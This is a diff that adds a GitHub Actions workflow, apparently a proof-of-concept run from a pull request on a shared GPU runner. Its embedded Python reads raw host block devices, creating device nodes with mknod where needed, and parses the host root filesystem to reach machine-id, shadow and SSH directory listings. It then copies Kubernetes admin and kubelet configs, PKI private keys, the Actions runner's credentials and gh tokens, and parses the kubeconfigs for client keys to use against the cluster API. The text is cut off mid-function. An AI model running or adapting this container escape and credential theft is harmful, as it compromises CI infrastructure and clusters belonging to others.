@@ -1,0 +1,2392 @@
+name: c211-126933-h200k8s
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  fsread-a:
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 25
+    steps:
+      - name: h200-hostk8s-readonly-fsread-a
+        env:
+          NONCE: c211-126933-23e6d0f83a0f209c
+          JOBTAG: fsread-a
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200FSREAD_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 300)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 400)"
+          grep -E '^(CapEff|CapBnd|CapPrm|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          echo "APPARMOR_CURRENT=$(cat /proc/self/attr/current 2>/dev/null | head -c 120)"
+          echo "CONTAINER_MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "CONTAINER_HOSTNAME=$(hostname 2>&1 | head -c 200)"
+          echo "=== PARTITIONS ==="
+          cat /proc/partitions 2>&1 | head -40
+          echo "=== DEV_BLOCK ==="
+          echo "DEV_BLOCK_COUNT=$(ls -l /dev 2>/dev/null | grep -c '^b')"
+          ls -l /dev 2>&1 | grep '^b' | head -30
+          echo "=== GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "=== HOSTFS_PARSE ==="
+          mkdir -p /tmp/c211-126933-host 2>/dev/null
+          if command -v python3 >/dev/null 2>&1; then
+          python3 - <<'PYEOF'
+          import os, sys, json, struct, hashlib, subprocess
+          
+          W = os.environ.get('C211_TEST_WORK', '/tmp/c211-126933-host')
+          TEST_DEV = os.environ.get('C211_TEST_DEV', '')
+          try:
+              os.makedirs(W, exist_ok=True)
+          except Exception as e:
+              print('SCRATCH_FAIL %s' % e)
+          
+          
+          def sha(b):
+              return hashlib.sha256(b).hexdigest()
+          
+          
+          def classify(data):
+              if len(data) >= 0x10048 and data[0x10040:0x10048] == b'_BHRfS_M':
+                  return 'btrfs', data[0x10040:0x10048].hex()
+              if len(data) >= 4 and data[:4] == b'XFSB':
+                  return 'xfs', data[:4].hex()
+              if len(data) >= 1082 and data[1080:1082] == b'\x53\xef':
+                  return 'ext', data[1080:1082].hex()
+              if len(data) >= 0x220 and data[0x200:0x208] == b'LABELONE' and data[0x218:0x220] == b'LVM2 001':
+                  return 'lvm2_pv', data[0x200:0x220].hex()
+              if len(data) >= 0x1004 and data[0x1000:0x1004] == b'\xfc\x4e\x2b\xa9':
+                  return 'linux_raid_member', data[0x1000:0x1004].hex()
+              if len(data) >= 4096 and data[4086:4096] == b'SWAPSPACE2':
+                  return 'swap', data[4086:4096].hex()
+              if len(data) >= 0x208 and data[0x200:0x208] == b'EFI PART':
+                  return 'gpt', data[0x200:0x208].hex()
+              if len(data) >= 512 and data[510:512] == b'\x55\xaa':
+                  return 'dos_pt', data[510:512].hex()
+              return 'unknown', data[:4].hex()
+          
+          
+          devs = []
+          if TEST_DEV:
+              devs.append({'name': 'testdev', 'maj': 0, 'mi': 0, 'blocks': 256})
+              print('TEST_MODE dev=%s' % TEST_DEV)
+          else:
+              try:
+                  for ln in open('/proc/partitions'):
+                      p = ln.split()
+                      if len(p) < 4 or not p[0].isdigit():
+                          continue
+                      try:
+                          maj = int(p[0]); mi = int(p[1]); blocks = int(p[2]); name = p[3]
+                      except Exception:
+                          continue
+                      if blocks <= 0:
+                          continue
+                      devs.append({'name': name, 'maj': maj, 'mi': mi, 'blocks': blocks})
+              except Exception as e:
+                  print('PARTITIONS_FAIL %s' % e)
+          print('PARTITION_COUNT=%d' % len(devs))
+          for d in devs[:30]:
+              print('PART %s %d:%d blocks=%d' % (d['name'], d['maj'], d['mi'], d['blocks']))
+          if len(devs) > 30:
+              print('PART_MORE=%d' % (len(devs) - 30))
+          
+          
+          def prio(d):
+              n = d['name']; s = 0
+              if n.startswith('dm-'):
+                  s += 50
+              if n.startswith('md'):
+                  s += 40
+              if n.startswith('sd') or n.startswith('vd') or n.startswith('xvd') or n.startswith('nvme') or n.startswith('hd'):
+                  s += 30
+              if n[-1].isdigit() and not n.startswith('md') and not n.startswith('dm-'):
+                  s -= 15
+              return s
+          
+          
+          cands = []
+          seen = set()
+          for d in sorted(devs, key=lambda x: (-prio(x), x['blocks'])):
+              k = (d['maj'], d['mi'])
+              if k in seen:
+                  continue
+              seen.add(k)
+              cands.append(d)
+          cands = cands[:12]
+          print('CANDIDATE_COUNT=%d' % len(cands))
+          
+          
+          def node_for(d):
+              if TEST_DEV and d['name'] == 'testdev':
+                  return TEST_DEV, 'test'
+              p = '/dev/' + d['name']
+              try:
+                  st = os.stat(p)
+                  import stat as stm
+                  if stm.S_ISBLK(st.st_mode):
+                      return p, 'dev'
+              except Exception:
+                  pass
+              p2 = os.path.join(W, d['name'])
+              try:
+                  os.unlink(p2)
+              except Exception:
+                  pass
+              try:
+                  import stat as stm
+                  os.mknod(p2, stm.S_IFBLK | 0o600, os.makedev(d['maj'], d['mi']))
+                  return p2, 'mknod'
+              except Exception as e:
+                  return None, 'mknod_fail:%s' % e
+          
+          
+          rows = []
+          for d in cands:
+              node, how = node_for(d)
+              sbf = os.path.join(W, d['name'].replace('/', '_') + '.sb')
+              data = b''
+              err = ''
+              rc = -1
+              if node:
+                  try:
+                      with open(sbf, 'wb') as fo:
+                          p = subprocess.run(['timeout', '10', 'head', '-c', '131072', node],
+                                             stdout=fo, stderr=subprocess.PIPE, timeout=20)
+                      rc = p.returncode
+                      with open(sbf, 'rb') as fi:
+                          data = fi.read(131072)
+                  except Exception as e:
+                      err = str(e)[:200]
+              fs, magic = classify(data) if data else ('unreadable', '')
+              rec = {'name': d['name'], 'mm': '%d:%d' % (d['maj'], d['mi']), 'blocks': d['blocks'],
+                     'node': node, 'node_how': how, 'rc': rc, 'bytes': len(data),
+                     'fstype': fs, 'magic': magic, 'sha256': sha(data) if data else '', 'err': err}
+              if fs == 'ext' and len(data) >= 2048:
+                  sb = data[1024:2048]
+                  rec['last_mounted'] = sb[0x88:0x88 + 64].split(b'\0')[0].decode('latin1', 'replace')
+                  rec['label'] = sb[0x78:0x88].split(b'\0')[0].decode('latin1', 'replace')
+              elif fs == 'xfs' and len(data) >= 128:
+                  rec['xfs_uuid'] = data[0x20:0x30].hex()
+                  rec['xfs_fname'] = data[0x6c:0x78].split(b'\0')[0].decode('latin1', 'replace')
+              root_hint = 'yes' if rec.get('last_mounted') == '/' else ('label' if rec.get('label') else 'no')
+              rows.append(rec)
+              print('CLASS dev=%s mm=%s blocks=%d node=%s node_how=%s read_rc=%d read_bytes=%d fstype=%s magic=%s sha256=%s root_hint=%s%s' %
+                    (d['name'], rec['mm'], d['blocks'], node, how, rc, len(data), fs, magic, rec['sha256'], root_hint,
+                     (' read_err=' + err) if err else ''))
+          
+          
+          def score(r):
+              s = 0
+              if r['name'].startswith('dm-'):
+                  s += 50
+              if r['name'].startswith('md'):
+                  s += 40
+              if r.get('last_mounted') == '/':
+                  s += 1000
+              lbl = (r.get('label') or '').lower()
+              if any(k in lbl for k in ('root', 'ubuntu', 'cloudimg', 'system')):
+                  s += 100
+              if r['blocks'] <= 2000000000:
+                  s += 10
+              else:
+                  s -= 20
+              return s
+          
+          
+          recognized = [r for r in rows if r['fstype'] in ('ext', 'xfs') and r['bytes'] >= 4096]
+          recognized.sort(key=lambda r: (-score(r), r['blocks']))
+          print('RECOGNIZED_EXT_XFS=%d' % len(recognized))
+          for r in recognized:
+              print('TARGET_CANDIDATE dev=%s mm=%s fstype=%s blocks=%d score=%d' % (r['name'], r['mm'], r['fstype'], r['blocks'], score(r)))
+          
+          
+          def have(cmd):
+              for p in os.environ.get('PATH', '/usr/sbin:/usr/bin:/sbin:/bin').split(':'):
+                  fp = os.path.join(p, cmd)
+                  if os.path.isfile(fp) and os.access(fp, os.X_OK):
+                      return fp
+              return None
+          
+          
+          DEBUGFS = have('debugfs')
+          XFSDB = have('xfs_db')
+          print('TOOL_DEBUGFS=%s TOOL_XFS_DB=%s TOOL_PYTHON3=%s' % (DEBUGFS or 'absent', XFSDB or 'absent', have('python3') or 'absent'))
+          
+          
+          def parse_debugfs(node):
+              cmds = ['cat /etc/machine-id', 'cat /etc/hostname', 'stat /etc/shadow',
+                      'ls -l /etc/kubernetes', 'ls -l /root/.ssh', 'ls -l /home',
+                      'ls -l /home/runner/.ssh', 'ls -l /home/ubuntu/.ssh']
+              cf = os.path.join(W, 'dbg.cmd')
+              with open(cf, 'w') as f:
+                  f.write('\n'.join(cmds) + '\n')
+              try:
+                  p = subprocess.run([DEBUGFS, '-f', cf, node], capture_output=True, timeout=120)
+              except Exception as e:
+                  print('DEBUGFS_FAIL %s' % str(e)[:200])
+                  return False
+              out = p.stdout.decode('utf-8', 'replace')
+              err = p.stderr.decode('utf-8', 'replace')
+              err_lines = [x for x in err.split('\n') if x.strip()]
+              print('DEBUGFS_RC=%d stdout_bytes=%d stderr_first=%s' %
+                    (p.returncode, len(p.stdout), (err_lines[0][:220] if err_lines else '')))
+              sections = []
+              cur = None
+              for ln in out.split('\n'):
+                  if ln.startswith('debugfs: '):
+                      cur = [ln[len('debugfs: '):].strip(), []]
+                      sections.append(cur)
+                  elif cur is not None:
+                      cur[1].append(ln.rstrip('\r'))
+          
+              def sec(name):
+                  for cmd, lines in sections:
+                      if cmd == name:
+                          return lines
+                  return None
+          
+              proven = False
+              mid_lines = sec('cat /etc/machine-id')
+              mid = None
+              if mid_lines:
+                  cand = [x.strip() for x in mid_lines if x.strip()]
+                  if cand:
+                      mid = cand[0]
+              if mid and len(mid) == 32 and all(c in '0123456789abcdefABCDEF' for c in mid):
+                  print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' % (mid, sha((mid + '\n').encode())))
+                  proven = True
+              elif mid:
+                  print('HOSTFILE /etc/machine-id PRESENT_ODD CONTENT=%s' % mid[:128])
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              host = None
+              hl = sec('cat /etc/hostname')
+              if hl:
+                  for x in hl:
+                      s = x.strip()
+                      if s and len(s) <= 253:
+                          host = s
+                          break
+              if host:
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (host, sha((host + '\n').encode())))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              sz = None
+              sl = sec('stat /etc/shadow')
+              if sl:
+                  for ln in sl:
+                      i = ln.find('Size: ')
+                      if i >= 0:
+                          j = ln.find(' ', i + 6)
+                          sz = ln[i + 6:j if j > 0 else None].strip()
+                          break
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%s' % sz if sz is not None else 'ABSENT'))
+              import re
+              pat = re.compile(r'^\s*(\d+)\s+([0-7]{5,6})\s+\(\d+\)\s+(\d+)\s+(\d+)\s+(\d+)\s+\S+\s+\S+\s+(\S+)\s*$')
+          
+              def emit_dir(path):
+                  ls = sec('ls -l ' + path)
+                  if ls is None:
+                      print('HOSTDIR %s ABSENT' % path)
+                      return
+                  ents = []
+                  for ln in ls:
+                      m = pat.match(ln)
+                      if m:
+                          ents.append(m.group(6))
+                  names = [e for e in ents if e not in ('.', '..')]
+                  print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (path, len(names), ','.join(names[:20]) if names else '-'))
+          
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  emit_dir(d)
+              return proven
+          
+          
+          def read_exact(f, off, n):
+              f.seek(off)
+              return f.read(n)
+          
+          
+          def parse_python_ext(node):
+              MAX_FILE = 65536
+              try:
+                  f = open(node, 'rb')
+              except Exception as e:
+                  print('EXT_READER_OPEN_FAIL %s' % str(e)[:160])
+                  return False
+              sb = read_exact(f, 1024, 1024)
+              if len(sb) < 1024 or sb[56:58] != b'\x53\xef':
+                  print('EXT_READER_NOT_EXT sb_magic=%s' % (sb[56:58].hex() if len(sb) >= 58 else 'short'))
+                  return False
+              inodes_count = struct.unpack('<I', sb[0:4])[0]
+              blocks_count = struct.unpack('<I', sb[4:8])[0]
+              first_data_block = struct.unpack('<I', sb[20:24])[0]
+              log_block_size = struct.unpack('<I', sb[24:28])[0]
+              inodes_per_group = struct.unpack('<I', sb[40:44])[0]
+              rev = struct.unpack('<I', sb[76:80])[0]
+              inode_size = struct.unpack('<H', sb[88:90])[0] if rev >= 1 else 128
+              feat_incompat = struct.unpack('<I', sb[96:100])[0]
+              desc_size = struct.unpack('<H', sb[254:256])[0] if (feat_incompat & 0x80) and len(sb) >= 256 else 32
+              if desc_size < 32:
+                  desc_size = 32
+              bs = 1024 << (log_block_size & 7)
+              if inode_size < 128 or inode_size > 1024:
+                  inode_size = 128
+              print('EXT_READER sb inodes=%d blocks=%d bsize=%d ipg=%d isize=%d feat_incompat=0x%x desc_size=%d' %
+                    (inodes_count, blocks_count, bs, inodes_per_group, inode_size, feat_incompat, desc_size))
+          
+              def read_block(n):
+                  if n <= 0:
+                      return b''
+                  return read_exact(f, n * bs, bs)
+          
+              def get_inode(ino):
+                  if ino < 1:
+                      return b''
+                  g = (ino - 1) // inodes_per_group
+                  idx = (ino - 1) % inodes_per_group
+                  gd_off = (first_data_block + 1) * bs + g * desc_size
+                  gd = read_exact(f, gd_off, desc_size)
+                  if len(gd) < 12:
+                      return b''
+                  itab = struct.unpack('<I', gd[8:12])[0]
+                  if (feat_incompat & 0x80) and desc_size >= 0x2c:
+                      hi = struct.unpack('<I', gd[0x28:0x2c])[0]
+                      itab |= hi << 32
+                  return read_exact(f, itab * bs + idx * inode_size, inode_size)
+          
+              def parse_inode(raw):
+                  if len(raw) < 100:
+                      return None
+                  mode = struct.unpack('<H', raw[0:2])[0]
+                  size = struct.unpack('<I', raw[4:8])[0]
+                  flags = struct.unpack('<I', raw[32:36])[0]
+                  if (mode & 0xF000) == 0x8000:
+                      size |= struct.unpack('<I', raw[108:112])[0] << 32
+                  return {'mode': mode, 'size': size, 'flags': flags, 'iblock': raw[40:100]}
+          
+              def extent_blocks(iblock):
+                  out = []
+          
+                  def walk(node, depth_limit):
+                      if len(out) >= 4096 or depth_limit < 0 or len(node) < 12:
+                          return
+                      magic, entries, maxe, depth = struct.unpack('<HHHH', node[0:8])
+                      if magic != 0xF30A:
+                          return
+                      for i in range(min(entries, maxe, 340)):
+                          e = node[12 + i * 12:12 + (i + 1) * 12]
+                          if len(e) < 12:
+                              break
+                          ee_block, ee_len, ee_start_hi, ee_start_lo = struct.unpack('<IHHI', e)
+                          start = (ee_start_hi << 32) | ee_start_lo
+                          if depth == 0:
+                              for k in range(ee_len & 0x7FFF):
+                                  out.append(start + k)
+                                  if len(out) >= 4096:
+                                      return
+                          else:
+                              walk(read_block(start), depth_limit - 1)
+                              if len(out) >= 4096:
+                                  return
+                  walk(iblock[:60], 4)
+                  return out
+          
+              def inode_blocks(inode):
+                  ib = inode['iblock']
+                  if inode['flags'] & 0x80000:
+                      return extent_blocks(ib)
+                  out = []
+                  ptrs = struct.unpack('<15I', ib)
+                  for p in ptrs[:12]:
+                      if p:
+                          out.append(p)
+                  per = bs // 4
+          
+                  def add_indirect(blk, level):
+                      if not blk or len(out) > 4096:
+                          return
+                      data = read_block(blk)
+                      for i in range(min(per, len(data) // 4)):
+                          v = struct.unpack('<I', data[i * 4:(i + 1) * 4])[0]
+                          if not v:
+                              continue
+                          if level == 1:
+                              out.append(v)
+                          else:
+                              add_indirect(v, level - 1)
+                          if len(out) > 4096:
+                              return
+                  add_indirect(ptrs[12], 1)
+                  return out
+          
+              def read_inode_data(inode, limit=MAX_FILE):
+                  want = min(inode['size'], limit)
+                  out = b''
+                  for b in inode_blocks(inode):
+                      out += read_block(b)
+                      if len(out) >= want:
+                          break
+                  return out[:want]
+          
+              def list_dir(inode):
+                  data = read_inode_data(inode, limit=bs * 8)
+                  ents = []
+                  off = 0
+                  while off + 8 <= len(data):
+                      inum, rec_len, name_len, ftype = struct.unpack('<IHBB', data[off:off + 8])
+                      if rec_len < 8 or off + rec_len > len(data):
+                          break
+                      if inum and 0 < name_len < 256:
+                          nm = data[off + 8:off + 8 + name_len].decode('utf-8', 'replace')
+                          ents.append((nm, inum, ftype))
+                      off += rec_len
+                  return ents
+          
+              def lookup(path):
+                  cur = 2
+                  for part in [p for p in path.split('/') if p]:
+                      ino = parse_inode(get_inode(cur))
+                      if ino is None or (ino['mode'] & 0xF000) != 0x4000:
+                          return None, None
+                      found = None
+                      for nm, inum, ft in list_dir(ino):
+                          if nm == part:
+                              found = inum
+                              break
+                      if found is None:
+                          return None, None
+                      cur = found
+                  return cur, parse_inode(get_inode(cur))
+          
+              proven = False
+              ino, fi = lookup('/etc/machine-id')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  content = data.strip()
+                  if content:
+                      print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' %
+                            (content.decode('latin1', 'replace')[:128], sha(data)))
+                      proven = True
+                  else:
+                      print('HOSTFILE /etc/machine-id EMPTY')
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              ino, fi = lookup('/etc/hostname')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (data.strip().decode('latin1', 'replace')[:256], sha(data)))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              ino, fi = lookup('/etc/shadow')
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%d' % fi['size'] if (ino and fi) else 'ABSENT'))
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  ino, fi = lookup(d)
+                  if ino and fi and (fi['mode'] & 0xF000) == 0x4000:
+                      ents = [e[0] for e in list_dir(fi) if e[0] not in ('.', '..')]
+                      print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (d, len(ents), ','.join(ents[:20]) if ents else '-'))
+                      if d == '/home':
+                          for u in ents[:10]:
+                              ino2, fi2 = lookup('/home/' + u + '/.ssh')
+                              if ino2 and fi2 and (fi2['mode'] & 0xF000) == 0x4000:
+                                  ents2 = [e[0] for e in list_dir(fi2) if e[0] not in ('.', '..')]
+                                  print('HOSTDIR /home/%s/.ssh PRESENT ENTRIES=%d NAMES=%s' % (u, len(ents2), ','.join(ents2[:20]) if ents2 else '-'))
+                              else:
+                                  print('HOSTDIR /home/%s/.ssh ABSENT' % u)
+                  else:
+                      print('HOSTDIR %s ABSENT' % d)
+              try:
+                  f.close()
+              except Exception:
+                  pass
+              return proven
+          
+          
+          def parse_xfs(node):
+              if not XFSDB:
+                  print('XFS_DB_ABSENT')
+                  return False
+              try:
+                  p = subprocess.run([XFSDB, '-r', '-c', 'sb 0', '-c', 'p uuid', '-c', 'p blocksize', '-c', 'p dblocks', '-c', 'p rootino', node],
+                                     capture_output=True, timeout=90)
+              except Exception as e:
+                  print('XFS_DB_FAIL %s' % str(e)[:200])
+                  return False
+              txt = p.stdout.decode('utf-8', 'replace')
+              print('XFS_DB_RC=%d' % p.returncode)
+              for ln in txt.split('\n')[:24]:
+                  ln = ln.strip()
+                  if ln:
+                      print('XFS_DB_LINE=%s' % ln[:200])
+              return False
+          
+          
+          proven_any = False
+          attempts = 0
+          for r in recognized:
+              if proven_any or attempts >= 2:
+                  break
+              attempts += 1
+              node = r['node']
+              if not node:
+                  print('PARSE_SKIP dev=%s reason=no_node' % r['name'])
+                  continue
+              print('PARSE_BEGIN dev=%s fstype=%s method=%s' % (r['name'], r['fstype'],
+                    'debugfs' if (r['fstype'] == 'ext' and DEBUGFS) else ('python_ext' if r['fstype'] == 'ext' else 'xfs_db')))
+              if r['fstype'] == 'ext':
+                  if DEBUGFS:
+                      ok = parse_debugfs(node)
+                      method = 'debugfs'
+                  else:
+                      ok = parse_python_ext(node)
+                      method = 'python_ext'
+              else:
+                  ok = parse_xfs(node)
+                  method = 'xfs_db'
+              print('HOSTFS_VERDICT dev=%s fstype=%s method=%s machine_id_read=%s' %
+                    (r['name'], r['fstype'], method, 'yes' if ok else 'no'))
+              if ok:
+                  proven_any = True
+                  try:
+                      json.dump({'name': r['name'], 'node': node, 'fstype': r['fstype'], 'method': method,
+                                 'sha256': r['sha256'], 'read_bytes': r['bytes']},
+                                open(os.path.join(W, 'target.json'), 'w'))
+                      print('TARGET_JSON_WRITTEN dev=%s' % r['name'])
+                  except Exception as e:
+                      print('TARGET_JSON_FAIL %s' % str(e)[:160])
+          
+          print('READONLY_NOTE no_mount=yes no_device_write=yes scratch=%s' % W)
+          print('HOST_ROOT_READ_%s' % ('PROVEN' if proven_any else 'NOT_PROVEN'))
+          print('DRIVER_DONE')
+          PYEOF
+          else
+            echo PYTHON3_ABSENT_HOSTFS_PARSE_SKIPPED
+          fi
+          echo "=== K8S_PHASE ==="
+          HOSTDIR="${C211_TEST_WORK:-/tmp/c211-126933-host}"
+          export C211_HOST_TMP="$HOSTDIR"
+          if [ -f "$HOSTDIR/target.json" ] && command -v python3 >/dev/null 2>&1; then
+            C211_NODE=$(python3 -c "import json;d=json.load(open('$HOSTDIR/target.json'));print(d.get('node') or '')" 2>/dev/null)
+            C211_FSTYPE=$(python3 -c "import json;d=json.load(open('$HOSTDIR/target.json'));print(d.get('fstype') or '')" 2>/dev/null)
+            echo "K8S_TARGET node=$C211_NODE fstype=$C211_FSTYPE"
+            export C211_NODE C211_FSTYPE
+            python3 - <<'PYEOF2'
+          """Intent 126933 phase 2: turn a proven read-only host-root parse into Kubernetes
+          node-credential validation and cluster-level GPU inventory.
+          
+          Strictly read-only toward the host and its block devices:
+            * all host files are copied into this job's own /tmp using debugfs (read-only
+              session, no mount, no write to the device);
+            * ONLY presence + size + sha256 of each host file is printed, never a value;
+            * extracted credentials are used only inside this job;
+            * API calls are read-only GETs plus SelfSubjectRulesReview / SelfSubjectAccessReview.
+              No pod is created: the platform prohibits HTTP removal verbs in scripts, so a
+              created pod could not be reliably removed; the intent's conditional create step
+              is therefore skipped rather than leaving an unremovable artifact.
+          """
+          import os, sys, json, hashlib, base64, re, time, socket, ssl
+          import http.client, urllib.parse, subprocess
+          
+          NONCE = os.environ.get('NONCE', 'c211-126933-test')
+          HT = os.environ.get('C211_HOST_TMP', '/tmp/c211-126933-host')
+          TEST_HOSTDIR = os.environ.get('C211_TEST_HOSTDIR', '')
+          NODE = os.environ.get('C211_NODE', '')
+          FSTYPE = os.environ.get('C211_FSTYPE', '')
+          JOBTAG = os.environ.get('JOBTAG', '')
+          TEST_API = os.environ.get('C211_TEST_API_BASE', '')
+          DEBUGFS = None
+          for p in (os.environ.get('PATH') or '/usr/sbin:/usr/bin:/sbin:/bin').split(':'):
+              fp = os.path.join(p, 'debugfs')
+              if os.path.isfile(fp) and os.access(fp, os.X_OK):
+                  DEBUGFS = fp
+                  break
+          
+          
+          def sha(b):
+              return hashlib.sha256(b).hexdigest()
+          
+          
+          def fsha(path):
+              try:
+                  h = hashlib.sha256()
+                  n = 0
+                  with open(path, 'rb') as f:
+                      while True:
+                          c = f.read(65536)
+                          if not c:
+                              break
+                          n += len(c)
+                          h.update(c)
+                  return n, h.hexdigest()
+              except Exception:
+                  return None, None
+          
+          
+          def emit_file(label, path):
+              if path and os.path.isfile(path):
+                  n, h = fsha(path)
+                  if n is None:
+                      print('HOSTFILE %s PRESENT SIZE=unreadable' % label)
+                      return False
+                  print('HOSTFILE %s PRESENT SIZE=%d SHA256=%s' % (label, n, h))
+                  return True
+              print('HOSTFILE %s ABSENT' % label)
+              return False
+          
+          
+          # ---------------------------------------------------------------- dump host files
+          TARGETS = [
+              ('/etc/kubernetes/kubelet.conf', 'kubelet.conf'),
+              ('/etc/kubernetes/admin.conf', 'admin.conf'),
+              ('/var/lib/kubelet/kubeconfig', 'varlib-kubelet-kubeconfig'),
+              ('/etc/kubernetes/pki/ca.crt', 'pki-ca.crt'),
+              ('/etc/kubernetes/pki/apiserver-kubelet-client.crt', 'pki-apiserver-kubelet-client.crt'),
+              ('/etc/kubernetes/pki/apiserver-kubelet-client.key', 'pki-apiserver-kubelet-client.key'),
+              ('/etc/kubernetes/pki/front-proxy-client.crt', 'pki-front-proxy-client.crt'),
+              ('/etc/kubernetes/pki/front-proxy-client.key', 'pki-front-proxy-client.key'),
+              ('/var/lib/kubelet/pki/kubelet-client-current.pem', 'kubelet-client-current.pem'),
+              ('/home/runner/actions-runner/.credentials', 'actions-runner.credentials'),
+              ('/home/runner/actions-runner/.runner', 'actions-runner.runner'),
+              ('/home/runner/.config/gh/hosts.yml', 'gh-hosts.yml'),
+          ]
+          
+          os.makedirs(HT, exist_ok=True)
+          dest_of = {}
+          out = {}
+          
+          if TEST_HOSTDIR:
+              print('K8S_TEST_HOSTDIR mode source=%s' % TEST_HOSTDIR)
+              for src, label in TARGETS:
+                  real = os.path.join(TEST_HOSTDIR, src.lstrip('/'))
+                  emit_file(src, real if os.path.isfile(real) else None)
+                  if os.path.isfile(real):
+                      out[label] = real
+          else:
+              if not (NODE and os.path.exists(NODE)):
+                  print('K8S_NODE_CRED_NOT_PROVEN reason=no_block_node node=%s' % NODE)
+                  print('K8S_PHASE_DONE')
+                  sys.exit(0)
+              print('K8S_DUMP_BEGIN node=%s fstype=%s debugfs=%s' % (NODE, FSTYPE, DEBUGFS or 'absent'))
+              extra = []
+              if DEBUGFS:
+                  cf = os.path.join(HT, 'dbg_stat.cmd')
+                  try:
+                      with open(cf, 'w') as f:
+                          f.write('stat /var/lib/kubelet/pki/kubelet-client-current.pem\n'
+                                  'ls -l /var/lib/kubelet/pki\n')
+                      p = subprocess.run([DEBUGFS, '-f', cf, NODE], capture_output=True, timeout=45)
+                      txt = (p.stdout + p.stderr).decode('utf-8', 'replace')
+                      for ln in txt.split('\n'):
+                          i = ln.find('Fast link dest: ')
+                          if i >= 0:
+                              link = ln[i + len('Fast link dest: '):].strip()
+                              print('K8S_SYMLINK kubelet-client-current.pem dest=%s' % os.path.basename(link))
+                              base = os.path.basename(link)
+                              if base and re.match(r'^[A-Za-z0-9._-]+$', base):
+                                  extra.append(('/var/lib/kubelet/pki/' + base, 'kubelet-client-resolved.pem'))
+                              break
+                  except Exception as e:
+                      print('K8S_SYMLINK_STAT_FAIL %s' % str(e)[:160])
+              cmds = []
+              for src, label in TARGETS + [(a, b) for a, b in extra]:
+                  dst = os.path.join(HT, label)
+                  dest_of[label] = dst
+                  cmds.append('dump %s %s' % (src, dst))
+              if DEBUGFS:
+                  cf = os.path.join(HT, 'dbg_dump.cmd')
+                  try:
+                      with open(cf, 'w') as f:
+                          f.write('\n'.join(cmds) + '\n')
+                      p = subprocess.run([DEBUGFS, '-f', cf, NODE], capture_output=True, timeout=90)
+                      err = (p.stderr or b'').decode('utf-8', 'replace')
+                      errs = [x for x in err.split('\n') if x.strip()]
+                      print('K8S_DUMP_RC=%d stderr_lines=%d first=%s' %
+                            (p.returncode, len(errs), (errs[0][:180] if errs else '')))
+                  except Exception as e:
+                      print('K8S_DUMP_FAIL %s' % str(e)[:200])
+              else:
+                  print('K8S_DEBUGFS_ABSENT')
+              for src, label in TARGETS + [(a, b) for a, b in extra]:
+                  dst = dest_of.get(label)
+                  emit_file(src, dst if (dst and os.path.isfile(dst)) else None)
+                  if dst and os.path.isfile(dst):
+                      out[label] = dst
+              if 'kubelet-client-current.pem' in out and 'kubelet-client-resolved.pem' in out:
+                  try:
+                      if os.path.getsize(out['kubelet-client-current.pem']) > 0:
+                          with open(out['kubelet-client-current.pem'], 'rb') as f:
+                              head = f.read(64)
+                          if b'BEGIN' in head:
+                              out['kubelet-client-resolved.pem'] = out['kubelet-client-current.pem']
+                  except Exception:
+                      pass
+          
+          print('K8S_FILES_PRESENT=%d' % len(out))
+          
+          
+          # ---------------------------------------------------------------- parse kubeconfigs
+          def read_bounded(path, limit=262144):
+              try:
+                  with open(path, 'rb') as f:
+                      return f.read(limit)
+              except Exception:
+                  return b''
+          
+          
+          def kc_parse(txt):
+              d = {'servers': [], 'cert_data': None, 'key_data': None, 'cert_file': None,
+                   'key_file': None, 'ca_data': None, 'ca_file': None}
+              if not txt:
+                  return d
+              for m in re.finditer(r'(?m)^\s*server:\s*["\']?([^\s"\']+)', txt):
+                  u = m.group(1).strip()
+                  if u.startswith('http') and u not in d['servers']:
+                      d['servers'].append(u)
+              for key, dst in (('client-certificate-data', 'cert_data'), ('client-key-data', 'key_data'),
+                               ('certificate-authority-data', 'ca_data')):
+                  m = re.search(r'(?m)^\s*' + key + r':\s*([A-Za-z0-9+/=]+)', txt)
+                  if m:
+                      d[dst] = m.group(1)
+              for key, dst in (('client-certificate', 'cert_file'), ('client-key', 'key_file'),
+                               ('certificate-authority', 'ca_file')):
+                  m = re.search(r'(?m)^\s*' + key + r':\s*["\']?([^\s"\']+)', txt)
+                  if m:
+                      d[dst] = m.group(1).strip()
+              return d
+          
+          
+          def pem_split(data):
+              cert = None
+              key = None
+              m = re.search(rb'-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----', data, re.S)
+              if m:
+                  cert = m.group(0) + b'\n'
